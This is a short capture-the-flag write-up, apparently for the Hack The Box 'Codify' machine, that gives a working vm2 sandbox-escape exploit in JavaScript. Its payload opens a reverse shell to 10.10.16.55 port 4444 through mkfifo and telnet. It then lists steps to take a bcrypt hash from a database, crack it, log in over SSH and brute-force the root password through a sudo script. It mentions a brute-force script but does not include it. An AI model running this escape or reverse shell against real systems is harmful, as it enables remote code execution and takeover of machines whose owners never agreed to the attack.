# codify-HTB-solution
For Reverse Shell


    const {VM} = require("vm2");
    const vm = new VM();
    
    const code = `
    err = {};
    const handler = {
        getPrototypeOf(target) {
            (function stack() {
                new Error().stack;
                stack();
            })();
        }
    };
      
    const proxiedErr = new Proxy(err, handler);
    try {
        throw proxiedErr;
    } catch ({constructor: c}) {
        c.constructor('return process')().mainModule.require('child_process').execSync("TF=$(mktemp -u);mkfifo $TF && telnet 10.10.16.55 4444 0<$TF | /bin/bash 1>$TF");
    }
    `
    
    console.log(vm.run(code));


SSH with user Joshua

1. open /var/www/contact/tickets.db in sqlite database browser and get password hash 
2. crack hash (its bcrypt) with rockyou.txt (takes like a minute)
3. SSH into Joshua, /home/Joshua/users.txt


Getting ROOT access

1. get proper shell with **export TERM=xterm**
2. sudo -l and you will find a script in /opt/scripts/mysql-backup.sh
3. bruteforce the root password using script below  (credits to @rwwwshell on breachforums.is)
4. **su root** and enter pass
5. root.txt is in /root/root.txt

I hope you find it cause this shit took me too long
